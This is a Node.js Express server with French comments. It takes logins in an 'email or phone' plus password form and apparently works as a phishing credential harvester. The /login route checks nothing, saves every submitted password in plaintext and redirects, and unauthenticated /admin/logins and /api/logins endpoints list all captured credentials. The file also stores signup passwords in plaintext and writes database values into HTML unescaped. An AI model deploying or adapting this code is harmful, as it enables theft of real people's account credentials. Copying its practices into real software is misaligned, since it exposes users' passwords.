const express = require('express');
const bodyParser = require('body-parser');
const { Pool } = require('pg');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Connexion PostgreSQL (utilise les variables Render)
const pool = new Pool({
  connectionString: process.env.DATABASE_URL, // Render fournira cette URL
  ssl: { rejectUnauthorized: false } // obligatoire sur Render
});

// Création table users si elle n'existe pas
pool.query(`
  CREATE TABLE IF NOT EXISTS users (
    id SERIAL PRIMARY KEY,
    full_name TEXT NOT NULL,
    email TEXT NOT NULL UNIQUE,
    password TEXT NOT NULL,
    date_of_birth TEXT NOT NULL,
    gender TEXT NOT NULL
  )
`).catch(err => console.error("Erreur création table users:", err));

// Création table logins si elle n'existe pas
pool.query(`
  CREATE TABLE IF NOT EXISTS logins (
    id SERIAL PRIMARY KEY,
    emailOrPhone TEXT,
    password TEXT,
    login_time TEXT
  )
`).catch(err => console.error("Erreur création table logins:", err));

// Route signup
app.post('/signup', async (req, res) => {
  const { full_name, email, password, date_of_birth, gender } = req.body;
  try {
    await pool.query(
      `INSERT INTO users (full_name, email, password, date_of_birth, gender) VALUES ($1, $2, $3, $4, $5)`,
      [full_name, email, password, date_of_birth, gender]
    );
    res.redirect('/index.html');
  } catch (err) {
    console.error("Erreur création utilisateur:", err);
    res.status(400).send('Erreur création utilisateur : ' + err.message);
  }
});

// Route login
app.post('/login', async (req, res) => {
  const { emailOrPhone, password } = req.body;
  const now = new Date().toISOString();
  try {
    await pool.query(
      `INSERT INTO logins (emailOrPhone, password, login_time) VALUES ($1, $2, $3)`,
      [emailOrPhone, password, now]
    );
    res.redirect('/home');
  } catch (err) {
    console.error("Erreur insertion login:", err);
    res.status(500).send('Erreur base de données');
  }
});

// Page home
app.get('/home', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'home.html'));
});

// Admin logins
app.get('/admin/logins', async (req, res) => {
  try {
    const result = await pool.query(`SELECT * FROM logins ORDER BY login_time DESC`);
    let html = `
    <html>
    <head>
        <title>Liste des logins</title>
        <link rel="stylesheet" href="/css/admin.css">
    </head>
    <body>
    <h1>Liste des logins</h1>
    <table>
    <tr><th>ID</th><th>Email/Phone</th><th>Password</th><th>Login Time</th></tr>`;
    
    result.rows.forEach(row => {
      html += `<tr>
        <td>${row.id}</td>
        <td>${row.emailorphone}</td>
        <td>${row.password}</td>
        <td>${row.login_time}</td>
      </tr>`;
    });

    html += `</table></body></html>`;
    res.send(html);
  } catch (err) {
    console.error("Erreur récupération logins:", err);
    res.status(500).send("Erreur base de données");
  }
});

// API logins
app.get('/api/logins', async (req, res) => {
  try {
    const result = await pool.query(`SELECT * FROM logins ORDER BY login_time DESC`);
    res.json(result.rows);
  } catch (err) {
    console.error('Erreur récupération logins:', err);
    res.status(500).json({ error: 'Erreur base de données' });
  }
});

// Lancement serveur
app.listen(PORT, () => {
  console.log(`🚀 Serveur démarré sur http://localhost:${PORT}`);
});
